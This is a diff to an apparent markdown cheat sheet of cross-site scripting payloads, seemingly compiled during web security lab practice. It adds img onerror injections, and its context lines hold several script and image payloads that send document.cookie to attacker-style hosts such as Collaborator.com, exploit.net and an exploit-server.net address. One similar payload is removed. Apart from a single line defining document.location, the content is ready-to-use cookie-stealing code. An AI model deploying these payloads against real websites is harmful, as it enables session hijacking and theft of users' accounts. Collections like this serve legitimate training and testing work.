@@ -57,6 +57,18 @@ document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
 </script>
 ```
 
+>HTML <img> Tag, with invalid Image source, with escape sequence from source code calling ```window.location``` for the **LastViewedProduct``` cookie.  
+
+```html
+&'><img src=1 onerror=print()>
+```  
+
+```html
+&'><img src=x onerror=this.src=/exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/exploit?'+document.cookie;>
+```  
+
+>***Document.location*** returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.  
+
 ```JavaScript
 document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
 ```  
@@ -126,10 +138,6 @@ x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cooki
 <script>
 document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
 </script>
-```
-
-```Javascript
-<img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
 ```
 
 ```Javascript
